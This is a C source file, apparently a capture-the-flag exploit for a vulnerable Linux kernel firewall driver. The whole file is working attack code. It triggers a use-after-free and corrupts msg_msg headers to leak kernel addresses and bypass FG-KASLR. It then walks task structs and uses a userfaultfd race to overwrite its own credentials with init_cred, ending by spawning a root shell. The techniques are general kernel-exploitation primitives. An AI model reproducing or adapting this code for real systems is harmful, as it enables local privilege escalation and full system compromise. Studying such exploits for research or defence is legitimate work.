#define _GNU_SOURCE
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <unistd.h>

// #include <linux/userfaultfd.h>
// if "linux/userfaultfd" not exists in you machine
#include "userfaultfd.h"

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_UNREGISTER 0x8010aa01

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

#define EASY_MODE 1
#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

int dev;
intptr_t target_addr, kernel_base, race_page, init_task, init_cred,
    init_ipc_ns = 0;
uint32_t target_idx;
pthread_t thread;

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
#ifdef EASY_MODE
  char desc[DESC_MAX];
#endif
} user_rule_t;

typedef struct {
  long mtype;
  char mtext[1];
} msg;

typedef struct {
  void *ll_next;
  void *ll_prev;
  long m_type;
  size_t m_ts;
  void *next;
  void *security;
} msg_header_t;

#define msg_msg_size 0x30

// print like gdb qwords, we round to nearest dqword
void hexprint(char *buffer, unsigned int bytes) {
  int dqwords = ((bytes + 0x10 - 1) & 0xfffffff0) / 0x10;
  int qwords = dqwords * 2;
  for (int i = 0; i < qwords; i += 2) {
    printf("0x%04x: 0x%016llx 0x%016llx\n", (i * 0x8),
           ((unsigned long long *)buffer)[i],
           ((unsigned long long *)buffer)[i + 1]);
  }
  puts("-----------------------------------------------");
  return;
}

void open_dev() {
  dev = open("/dev/firewall", O_RDONLY);
  if (dev < 0) {
    perror("Opening device");
  }
  puts("[+] Interacting with device");
}

void gen_dot_notation(char *buf, uint32_t val) {
  sprintf(buf, "%d.%d.%d.%d", val & 0x000000FF, (val & 0x0000FF00) >> 8,
          (val & 0x00FF0000) >> 16, (val & 0xFF000000) >> 24);
}

void parse_rule_payload(char *input, uint8_t idx, int type, user_rule_t *rule) {
  char addr[0x10];
  uint32_t ip = *(uint32_t *)&input[0x20];
  uint32_t netmask = *(uint32_t *)&input[0x24];

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, ip);
  memcpy(rule->ip, addr, 0x10);

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, netmask);
  memcpy(rule->netmask, addr, 0x10);

  memcpy(rule->iface, input, 0x10);
  memcpy(rule->name, &input[0x10], 0x10);
  memcpy(&rule->proto, &input[0x28], 2);
  memcpy(&rule->port, &input[0x28 + 2], 2);
  memcpy(&rule->action, &input[0x28 + 2 + 2], 1);
  rule->idx = idx;
  rule->type = type;
}

int firewall_add_rule(uint8_t idx, int type, char *buf) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  parse_rule_payload(buf, idx, type, &user_rule);
  return ioctl(dev, ADD_RULE, &user_rule);
}

int firewall_delete_rule(uint8_t idx, int type) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  user_rule.idx = idx;
  user_rule.type = type;
  return ioctl(dev, DELETE_RULE, &user_rule);
}

int firewall_edit_rule(uint8_t idx, int type, char *buf, int invalidate) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  parse_rule_payload(buf, idx, type, &user_rule);
  if (invalidate) {
    strcpy((void *)&user_rule.ip, "invalid");
    strcpy((void *)&user_rule.netmask, "invalid");
  }
  return ioctl(dev, EDIT_RULE, &user_rule);
}

int firewall_dup_rule(uint8_t idx, int type) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  user_rule.idx = idx;
  user_rule.type = type;
  return ioctl(dev, DUP_RULE, &user_rule);
}

int make_queue(key_t key, int msg_flags) {
  int result = msgget(key, msg_flags);
  if (result == -1) {
    perror("msgget failure");
    exit(-1);
  }
  return result;
}

void send_msg(int msqid, void *message, size_t msgsz, int msg_flags) {
  if (msgsnd(msqid, message, msgsz, msg_flags) == -1) {
    perror("msgsend failure");
    exit(-1);
  }
}

void get_msg(int msqid, void *message, size_t msgsz, long msg_type,
             int msg_flags) {
  if (msgrcv(msqid, message, msgsz, msg_type, msg_flags) < 0) {
    perror("msgrcv failure");
    exit(-1);
  }
}

void *arb_write(void *arg) {
  struct pollfd pollfd;
  struct uffdio_range uf_range;
  struct uffdio_copy uf_copy;
  struct uffd_msg uf_msg;
  long userfault_fd = (long)arg;

  pollfd.fd = userfault_fd;
  pollfd.events = POLLIN;

  uf_range.start = race_page;
  uf_range.len = 0x1000;
  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      perror("polling error");
      exit(-1);
    }

    if (read(userfault_fd, &uf_msg, sizeof(uf_msg)) == 0) {
      perror("reading message event");
      exit(-1);
    }

    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      perror("Unexpected event on userfaultfd");
      exit(-1);
    }

    char uf_buffer[0x1000];
    memset(uf_buffer, 'C', sizeof(uf_buffer));
    memcpy(uf_buffer + 0x1000 - msg_msg_size, &init_cred, 8);      // real_cred
    memcpy(uf_buffer + 0x1000 - msg_msg_size + 8, &init_cred, 8);  // cred

    uf_copy.src = (unsigned long)uf_buffer;
    uf_copy.dst = race_page;
    uf_copy.len = 0x1000;
    uf_copy.mode = 0;
    uf_copy.copy = 0;

    char buffer[0x2000];
    memset(buffer, 0, sizeof(buffer));

    msg_header_t evil;
    memset(&evil, 0, sizeof(msg_header_t));
    evil.ll_next = (void *)0xbeefbee1;
    evil.ll_prev = (void *)0xdeadbeef;
    evil.m_type = 1;
    evil.m_ts = 0x1000 - msg_msg_size + 8;
    evil.next = (void *)target_addr;
    memcpy(buffer, &evil, sizeof(msg_header_t));
    firewall_edit_rule(target_idx, OUTBOUND, buffer, 0);

    if (ioctl(userfault_fd, UFFDIO_COPY, &uf_copy) == -1) {
      perror("uffdio_copy error");
      exit(-1);
    }
    if (ioctl(userfault_fd, UFFDIO_UNREGISTER, &uf_range) == -1) {
      perror("uffdio_unregister error");
      exit(-1);
    }
    if (munmap((void *)race_page, 0x1000) == -1) {
      perror("munmap error");
      exit(-1);
    }
    return 0;
  }

  return 0;
}

void register_userfault(uint64_t race_page, pthread_t thread,
                        void *(*func)(void *)) {
  int userfault_fd, race;
  struct uffdio_api uf_api;
  struct uffdio_register uf_register;
  userfault_fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  uf_api.api = UFFD_API;
  uf_api.features = 0;

  if (ioctl(userfault_fd, UFFDIO_API, &uf_api) == -1) {
    perror("uffdio_api");
    exit(-1);
  }

  printf("[+] Registering userfault for %p\n", (void *)race_page);
  if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,
           0) != (void *)race_page) {
    perror("error mmapping race_page");
    exit(-1);
  }

  uf_register.range.start = race_page;
  uf_register.range.len = 0x1000;
  uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

  if (ioctl(userfault_fd, UFFDIO_REGISTER, &uf_register) == -1) {
    perror("error registering page for userfaultfd");
    exit(-1);
  }

  race = pthread_create(&thread, NULL, func, (void *)(long)userfault_fd);
  if (race != 0) {
    perror("cant setup thread for race");
    exit(-1);
  }
}

int main() {
  open_dev();
  char buffer[0x2000], received[0x2000];
  msg *message = (msg *)buffer;

  memset(buffer, 0, sizeof(buffer));
  memset(buffer, 'A', 0x40);
  for (int i = 0x50; i < 0x54; i++) {
    firewall_add_rule(i, INBOUND, buffer);
  }
  firewall_add_rule(0, INBOUND, buffer);
  firewall_dup_rule(0, INBOUND);
  int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

  int size = 0x1010;
  message->mtype = 1;
  memset(message->mtext, 'A', size);

  // trigger UAF
  firewall_delete_rule(0, INBOUND);

  // alloc in same chunk
  send_msg(qid, message, size - msg_msg_size, 0);

  // For FG-KASLR leak, we spray the shm_file_data in
  // kmalloc-32 to get "init_ipc_ns", a kernel data ptr
  int shmid;
  char *shmaddr;
  for (size_t i = 0; i < 0x50; i++) {
    shmid = shmget(IPC_PRIVATE, 100, 0600);
    if (shmid == -1) {
    }
    shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void *)-1) {
    }
  }

  msg_header_t evil;
  size = 0x1400;
  memset(&evil, 0, sizeof(msg_header_t));
  evil.ll_next = (void *)0x4141414141414141;
  evil.ll_prev = (void *)0x4242424242424242;
  evil.m_type = 1;
  evil.m_ts = size;
  memset(buffer, 0, sizeof(buffer));
  memcpy(buffer, &evil, 0x20);
  // write after free to corrupt msg_msg header
  firewall_edit_rule(0, OUTBOUND, buffer, 1);

  // get we leak after corrupt msg_msg header
  get_msg(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  for (size_t i = 0; i < size / 8; i++) {
    uint64_t ipc_ns = *(uint64_t *)(received + i * 8);
    if ((ipc_ns & 0xfff) == 0x7a0) {
      init_ipc_ns = ipc_ns;
      break;
    }
  }
  if (init_ipc_ns == 0) {
    perror("Something happened on leak memory");
    exit(-1);
  }

  kernel_base = init_ipc_ns - 0xc3d7a0;
  init_task = kernel_base + 0xc124c0;
  init_cred = kernel_base + 0xc33060;
  printf("[+] init_ipc_ns: %p\n", (void *)init_ipc_ns);
  printf("[+] kernel base: %p\n", (void *)kernel_base);
  printf("[+] init_task: %p\n", (void *)init_task);
  printf("[+] init_cred: %p\n", (void *)init_cred);

  memset(buffer, 0, sizeof(buffer));
  memset(received, 0, sizeof(received));
  memset(&evil, 0, sizeof(msg_header_t));

  evil.m_type = 1;
  evil.m_ts = size;
  evil.next = (void *)init_task + 0x298 - 0x8;

  memcpy(buffer, &evil, sizeof(msg_header_t));
  // corrupt msg_msg header
  firewall_edit_rule(0, OUTBOUND, buffer, 0);
  get_msg(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

  pid_t pid, my_pid = getpid();
  intptr_t prev_task, current_task;
  memcpy(&prev_task, received + 0xfe0, 8);
  memcpy(&pid, received + 0x10d8, 4);

  printf("[!] Searching current task struct\n");
  printf("[+] hit_pid=%d target_pid=%d\n", pid, my_pid);
  while (pid != my_pid) {
    current_task = prev_task - 0x298;
    evil.next = (void *)prev_task - 0x8;
    memcpy(buffer, &evil, sizeof(msg_header_t));
    firewall_edit_rule(0, OUTBOUND, buffer, 0);
    get_msg(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    memcpy(&prev_task, received + 0xfe0, 8);
    memcpy(&pid, received + 0x10d8, 4);
    printf("[+] hit_pid=%d target_pid=%d\n", pid, my_pid);
  }

  printf("[+] Found! current task: %p\n", (void *)current_task);

  // Create new UAF
  firewall_add_rule(1, INBOUND, buffer);
  firewall_dup_rule(1, INBOUND);
  firewall_delete_rule(1, INBOUND);
  // real_cred and cred is at 0x538 and 0x540
  memset(buffer, 0, sizeof(buffer));

  msg *rooter;
  void *evil_page = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  printf("[+] evil_page: %p\n", evil_page);
  race_page = (intptr_t)evil_page + 0x1000;
  rooter = (msg *)(race_page - 0x8);

  rooter->mtype = 1;
  size = 0x1010;
  target_idx = 1;
  target_addr = current_task + 0x538 - 0x8;
  register_userfault(race_page, thread, arb_write);
  send_msg(qid, rooter, size - msg_msg_size, 0);

  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] r00t3d: uid=%d\n", uid);
    system("/bin/sh");
  } else {
    printf("[-] not yet: uid=%d\n", uid);
    exit(-1);
  }
}
